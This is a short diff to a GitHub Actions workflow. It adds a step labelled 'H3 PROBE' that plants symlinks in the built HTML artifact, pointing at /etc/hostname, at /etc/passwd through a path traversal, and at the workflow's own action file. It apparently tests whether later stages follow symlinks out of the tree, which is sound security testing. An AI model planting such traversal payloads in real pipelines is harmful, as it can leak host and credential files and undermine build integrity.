@@ -26,6 +26,15 @@ jobs:
       - uses: ./.github/actions/engine
         with:
           args: build
+      - name: "H3 PROBE — plant symlink payloads in the build artifact"
+        run: |
+          set -x
+          cd _build/html
+          ln -s /etc/hostname            h3-leak-abs   # absolute symlink to a host file
+          ln -s ../../../../../etc/passwd h3-leak-rel  # relative traversal out of the tree
+          ln -s ../../.github/actions/engine/action.yml h3-leak-shim # aim at the frozen shim
+          echo "H3-MARKER planted" > h3-marker.txt
+          ls -la
       - name: Stash PR number # workflow_run.pull_requests is EMPTY for forks (§6a)
         if: ${{ github.event_name == 'pull_request' }}
         run: echo "${{ github.event.pull_request.number }}" > _build/html/.pr-number
